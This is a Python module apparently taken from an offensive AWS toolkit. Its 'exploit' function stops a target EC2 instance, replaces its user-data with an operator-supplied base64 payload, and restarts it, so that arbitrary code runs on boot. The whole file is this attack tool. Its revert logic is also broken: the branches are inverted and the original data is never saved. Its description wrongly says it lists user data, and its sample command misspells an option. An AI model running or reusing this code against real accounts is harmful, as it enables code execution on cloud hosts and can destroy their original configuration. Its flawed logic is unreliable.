import time

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "ec2",
        "required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
    },
    "INSTANCE-ID": {
        "value": "",
        "required": "true",
        "description":"The instance ID to modify the user-data."
    },
    "USER-DATA-CONTENT": {
        "value": "",
        "required": "true",
        "description":"The base64 blob of USER-DATA Content to put on instance"
    },
    "REVERT-USER-DATA": {
        "value": "false",
        "required": "true",
        "description": "If this option is set to true, the module will revert the old user data back. If OLD-USER-DATA is set, ec2:DescribeInstanceAttribute will not be executed, otherwise the old user data will be taken from it.",
        "choices": ["true", "false"]
    },
    "OLD-USER-DATA": {
        "value": "false",
        "required": "true",
        "description":"If REVERT-USER-DATA is set and this option is filled, ec2:DescribeInstanceAttribute will not be executed, but this user data will be set.",
    }
}

description = "Lists User data of an Instance provided. Requires Secret Key and Access Key of an IAM that has access to it."

aws_command = "aws ec2 modify-instance-attribute --intance-id <instance ID> --region <region> --attribute userData --user-data <base64 of user data> --profile <profile>"

def changeuserdata(profile, instance, content):
    try:
        profile.stop_instances(
            InstanceIds=[
                instance
            ]
        )
        time.sleep(30)

        profile.modify_instance_attribute(
            InstanceId=instance,
            UserData={
                'Value': content
            }
        )

        profile.start_instances(
            InstanceIds=[
                instance
            ]
        )
        time.sleep(30)
        return {
            "InstanceID": instance,
            "Status": "Instance User Data Modified"
        }
    except Exception as e:
        return {"error": f"Error modifying user-data: {str(e)}"}

def exploit(profile, callstoprofile):
    oldcontent = variables['OLD-USER-DATA']['value']
    content = variables['USER-DATA-CONTENT']['value']
    revertuserdata = variables['REVERT-USER-DATA']['value']
    instance = variables['INSTANCE-ID']['value']

    returnData = changeuserdata(profile, instance, content)

    if revertuserdata.lower() == "true":
        if oldcontent != "":
            try:
                newcontent = profile.describe_instance_attribute(
                    InstanceId=instance,
                    Attribute='userData'
                )['UserData']['Value']
                newReturnData = changeuserdata(profile, instance, newcontent)
                if "error" in newReturnData:
                    returnData['ResetUserDataStatus'] = newReturnData['error']
                else:
                    returnData['ResetUserDataStatus'] = "UserData was reset successfully"

            except Exception as e:
                returnData['ResetUserDataStatus'] = f"Error reseting user-data: {str(e)}"
        else:
            try:
                newReturnData = changeuserdata(profile, instance, oldcontent)
                if "error" in newReturnData:
                    returnData['ResetUserDataStatus'] = newReturnData['error']
                else:
                    returnData['ResetUserDataStatus'] = "UserData was reset successfully"

            except Exception as e:
                returnData['ResetUserDataStatus'] = f"Error reseting user-data: {str(e)}"

    return returnData